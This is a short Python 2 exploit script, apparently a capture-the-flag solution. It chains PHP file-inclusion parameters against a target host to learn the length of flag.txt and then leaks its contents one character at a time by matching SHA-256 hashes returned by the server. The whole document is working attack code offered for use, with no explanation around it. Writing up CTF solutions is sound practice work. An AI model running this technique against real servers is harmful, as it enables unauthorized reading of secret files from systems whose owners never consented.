#!/usr/bin/env python2

import requests
import string
from hashlib import sha256
import argparse

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument('host', metavar='host', type=str)

    args = parser.parse_args()

    prefix = "1"

    files = ['94.php', '67.php', '90.php', '69.php', '45.php', '2.php', '56.php']

    file_inclusion_s = '&'.join([str(i + 1) + '=' + files[i] for i in xrange(len(files))])

    # Filenames will change
    start_url = "http://{}:8081?".format(args.host) + file_inclusion_s + "&xxx=flag.txt&fru=0&s=" + prefix

    # Start by deducing the length of the flag
    former = ""
    current = "a"
    count = 0

    print('[+] Calculating the length of the flag...')

    while former != current:
      count += 1
      former = current
      current = requests.get(start_url + "&tro=" + str(count)).text

    count -= 1

    print('[+] Flag is {0} characters long'.format(count))
    print('[+] Leaking the flag...')

    flag = ""

    for i in range(count):
      c_hash = requests.get(start_url + "&tro=" + str(i)).text
      for c in string.printable:
        h = sha256()
        h.update(prefix + flag + c)
        if h.hexdigest() == c_hash:
          print('[+] Found character {0} [{1}/{2}]').format(c, str(i + 1), str(count))
          flag += c
          break

    print('[+] Flag is ' + flag)

if __name__ == "__main__":
    main()
